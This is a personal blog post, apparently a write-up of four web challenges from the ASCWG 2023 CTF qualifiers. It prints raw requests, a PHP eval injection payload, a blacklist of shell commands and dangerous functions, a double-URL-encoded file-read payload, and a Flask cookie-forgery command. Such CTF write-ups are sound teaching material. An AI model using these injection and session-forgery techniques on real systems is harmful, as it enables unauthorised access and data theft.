---
layout: post
title:  "Arab Security Conference War Games Qualifications 2023"
description: ASCWG WEB WRITEUP
image: 
  path: /assets/img/blog/ASCWG.jpeg
tags: CTF
date:   2023-08-06 13:49:56 +0300
category: CTF
---
HI I am Mohammed Ashraf AKA logan0x

and this is my Writeup for ASCWG QUAL 2023

WE GOT 7TH IN THE QUALIFICATIONS .

![ASCWG.jpg](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/ASCWG.jpg)

AND WE SOLVED `5 OUT OF 7` WEB CHALLENGES

![Screenshot (336).png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/Screenshot_(336).png)

# SADQL (600 POINT - MEDIUM )

![logo_1.png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/logo_1.png)

JUST a basic login page and no other directories found

so first thing come to my mind is sql injection because of the name of the challenge `sadql` .

lets see the request

```
POST /sadql/ HTTP/1.1
Host: 34.18.16.17
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://34.18.16.17/sadql/
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: http://34.18.16.17
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

email=admin&password=random&submit=Login
```

the response just tells me that “ there is an error in username or password”

so after tried basic payload like `[]` the response shows and error

 request :

```
POST /sadql/ HTTP/1.1
Host: 34.18.16.17
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://34.18.16.17/sadql/
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: http://34.18.16.17
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

email[]=admin&password=random&submit=Login
```

response :

```
charset.UTF-8 ke 8 9 <be 1, 10 <b> 
Fatal error </b> Uncaught TypeError: addslashes(): Argument #1 ($string) must be of type string, array given in 
C:\xamppx\htdocs\sadql\index.php:11 11 Stack trace: 12 #0 C:\xamppx\htdocs\sadql\index.php(11):
 addslashes(Array) 13 #1 {main} 14 thrown in <b> C:\xamppx\htdocs\sadql\index.php </b> on line <b> 11
```

the error indicates that `addslashes()` is used to escape the input , it’s my first time to deal with this function so i just hit google and found this amazing [BLOG](https://www.securityidiots.com/Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html) that explain in details how to bypass

and this is our payload :

![before_filter.png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/before_filter.png)

with a little focus on the error you can understand that the application have some filters as he filtered `or` from our payload , so we will try to bypass it 

![or_filter.png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/or_filter.png)

so we are able to skip filter for or successfully. but there is another filter for white spaces.

i just used  [basic technique](https://portswigger.net/support/sql-injection-bypassing-common-filters) to skip this filter .

so let’s craft the final payload :

![result_1.png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/result_1.png)

BINGOOOOOO WE GET OUR FLAG !!!!!!!!!!!!

# INIECTIO ( 300 POINT - EASY )

![spaces_cOm0nldr8lH1TylcbDG1_uploads_rqMbMcF69qE0qS6sLgom_image.webp](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/spaces_cOm0nldr8lH1TylcbDG1_uploads_rqMbMcF69qE0qS6sLgom_image.webp)

Translation of the challenge description :

> 10 this week she got sick and went to the hospital and the nurse gave her a serum injection and now she is fine.
> 

so from description we understand that it’s a type of injection.

description link was :

> http://34.18.3.149:8000/xchal.php?name=xchal.php
> 

so i tried to fetch the source using `~` , so i made a request to `http://IP:port/xchal.php~`

and i get the source code.

source code :

```php
<?php
  
  $dangerousFunctions = array('GET','POST','print','exec', 'shell_exec', 'popen', 'system', 'touch', 'echo', 'mv', 'cp', 'sed','``', 'passthru', 'proc_open', 'while', 'read ', '>', '<', 'nano', 'vi', 'vim', 'fopen', 'fgets', 'fgetc', 'file_get_contents', 'fwrite', 'file_put_contents', 'curl_exec', 'curl_multi_exec', 'parse_ini_file', 'sleep', 'rm', 'mkdir', '}', 'show_source', 'symlink', 'apache_child_terminate', 'apache_setenv', 'define_syslog_variables', 'escapeshellarg', 'escapeshellcmd', 'eval', 'pcntl_exec', 'posix_kill', 'posix_mkfifo', 'posix_setpgid', 'posix_setsid', 'posix_setuid', 'posix_uname', 'proc_close', 'proc_get_status', 'proc_nice', 'proc_terminate', 'putenv', 'register_shutdown_function', 'register_tick_function', 'ini_set', 'set_time_limit', 'set_include_path', 'header', 'mail', 'readfile', 'file_get_contents', 'file_put_contents', 'unlink', 'cat', 'tail', 'head', 'more', 'less', 'dd', 'od', 'xxd', 'tac', 'hexdump', 'file', 'awk', 'nano', 'vim', 'iconv', 'strings', 'rev', '|');

  $name = $_GET['name'];
  if (strlen($name) > 36) {
    die ("The name is too long.");
  }

  
  foreach ($dangerousFunctions as $func) {
    if (stripos($name, $func) !== false) {
      die("oooooooooooh hacker !");
    }
  }
?>

<!DOCTYPE html>
<html>
<head>
 <style>
    body {
      background-image: url("x.webp");
      background-repeat: no-repeat;
      background-size: cover;
      background-position: center center;
      height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    @media (max-width: 768px) {
      body {
        background-size: contain;
      }
    }
  </style> 
</head>
<body>
  <?php
    
   $str = "echo \"<div style='position: fixed; top: 0; left: 0;'><p style='font-size: x-large; color: white;'>Hello " . $name . "!!!</p></div>\";";

    eval($str);
  ?>
</body>
</html>
```

you can notice that we have a `$name` parameter and it must be less than 36 in length, and if our payload do not have any of the commands in the `$dangerousFunctions` array , the payload will be passed to `eval`function.

in this part i was not able to bypass this blacklist , but after a lot of research i found out i can use `var_dump()` and `scandir()` to list the files in the directory.

Payload :

> `http://34.18.3.149:8000/xchal.php?name="%26%26+var_dump(scandir('.'));%23`
> 

Response :

```php
<!DOCTYPE html>
<html>
<head>
 <style>
    body {
      background-image: url("x.webp");
      background-repeat: no-repeat;
      background-size: cover;
      background-position: center center;
      height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    @media (max-width: 768px) {
      body {
        background-size: contain;
      }
    }
  </style> 
</head>
<body>
  array(6) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(8) "flag.php"
  [3]=>
  string(6) "x.webp"
  [4]=>
  string(9) "xchal.php"
  [5]=>
  string(10) "xchal.php~"
}
</body>
</html>
```

 we can see that there is a file called `flag.php`

so i tried to access it directly from the browser `http://34.18.3.149:8000//xchal.php?name=flag.php`

but it throw an error because it’s extension is php but the file just have a  ASCWG{FLAG}

SO it can’t be executed.

again , after time a good idea get into my mind and it was why not to copy the `flag.php` to `flag.txt` and access it with  `http://34.18.3.149:8000//xchal.php?name=flag.txt`

![Screenshot (318).png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/Screenshot_(318).png)

Let’s try to access the flag :

![Screenshot (319).png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/Screenshot_(319).png)

WE GOT IT !!!!!!!!!!!!!!!!!!!

# N1 ( 200 POINT - EASY )

![0 KQF_UXJGquiVKpa0.webp](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/0_KQF_UXJGquiVKpa0.webp)

After opening the link i found no thing but :

![banner.webp](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/banner.webp)

after checking the source code i did not find anything so i checked `robotx.txt` and found that 

```php
User-agent: *
Disallow: /tmp/ASCWG/flag.txt
```

tried to access it but the servers gives us `404`

i checked the description agian and it says : Do not brute force.

i brute forcing (:

using burpsuite extension called `ParamMiner` i found a GET parameter ?`?url=`

so tried to access the flag with : `http://ip:port/?url=/tmp/ASCWG/flag.txt`

this time the server gives it another response :

![Screenshot (323).png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/Screenshot_(323).png)

i tried another paths and some response, i tried also to set the value of of the parameter to be an empty value `?url=` but i returned with the same response 

so after hours and hours and trying random payload because the filter always print `NOOOOOOOOB!!!! Hacking Attempt`  so there was no way to avoid random payload

and finally i bypassed it with `Double - URL encoding` for every “/” in the path 

so the final payload : `?url=%252Ftmp%252FASCWG%252Fflag.txt` and i Finally got the Fflag.

# Father’s Light ( 600 Points - Medium )

![specs.webp](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/specs.webp)

After clicking the link you will find this login panel at `/login`

![banner.webp](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/banner%201.webp)

First thing i did is directory fuzzing 

and i found three directories :  `POST`  `Dashboard` `login` 

tried to access but can not .

so tried SQL Injection with and the server respond with  `DO YOU THINK YOU CAN HACK MY APPLICATION !!!!!!!!!!!!!` , every basic payload i get the same message, so i tried to get some error so i set the username and password value like this : `username[]=test&password=test` and the server successfully send us error and part of the `source code` was in this error 

from this source code know some juicy information 

1- the app is flask

2 - the default credentials is `username=admin&password=password`

i logged in and found that :   

![Screenshot (325).png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/Screenshot_(325).png)

REGULAR USER !!!!!!!!!!!!!!!!!!!!!!!!!!!

immediately, i fire my burp and i found there is a token in the request

```txt
.eJyrVsosjk9Myc3MU7JKS8wpTtVRKi1OLYrPTFGyUjI0M1KC8PMSc1OBAhCFtQDj5xGP.ZM13MQ.Cl1kJQYZhQHtS2l9L8CeRysHqcc
```

so a flask app and a token, a SHORT token

the whole scenario came to my mind in this moment : we will decode the token , brute force the secret , modify the token and signed it , be admin , and get the flag

![https://media4.giphy.com/media/UO5elnTqo4vSg/giphy.gif?cid=7941fdc6owrwk56a714nykj643z6zjgtjx91y2tq9sexpndx&ep=v1_gifs_trending&rid=giphy.gif&ct=g](https://media4.giphy.com/media/UO5elnTqo4vSg/giphy.gif?cid=7941fdc6owrwk56a714nykj643z6zjgtjx91y2tq9sexpndx&ep=v1_gifs_trending&rid=giphy.gif&ct=g)

let’s do it :

![Screenshot (329).png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/Screenshot_(329).png)

so it’s clear now , we will brute force the secret the modify the token to be like that `{"is_admin":true,"user_id":"1","username":"admin"}`

and in these tasks we will use the awesome tool [Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign):

1- brute force the secret key

![brute.png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/brute.png)

the secret key is `amorlove`

2 - let’s modify the token and sign it :

```php
logan0x@logan0x:~/Flask-Unsign/flask_unsign$ flask-unsign --sign --cookie "{'is_admin': True, 'user_id': '1', 'username': 'admin'}" --secret "b'amorlove'"
.eJyrVsosjk9Myc3MU7IqKSpN1VEqLU4tis9MUbJSMlSC8PISc1OBXIiqWgC2jxDc.ZM2mig._Qbf3SobuNZFhAgm4Win-cIwKJ4 //the new token
```

now let’s get the flag :

![Screenshot (331).png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/Screenshot_(331).png)

wait whatttt where is the flag ???

let’s check the directories we FUZZ previously

i visit the interesting one `/dashboard`

![Screenshot (333).png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/Screenshot_(333).png)

I was able to see the "/dashboard" endpoint, which was a page for posting after replacing the flask token with the altered one. It printed the username and the text of the post after attempting to publish something.

So I tested the SSTI vulnerability with the typical {{7*7}} It also worked:

![ssti.png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/ssti.png)

so i tried to get the flag with `{{config}}`

but there is a filter so i can not get the response i want 

![config.png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/config.png)

so i just tried to make a url encoding to `config` as a first try and i woooow i got the flag.

![flag.png](/assets/img/blog/BLOG%2034a686eb96fd436bb80286dfa0e092a3/flag.png)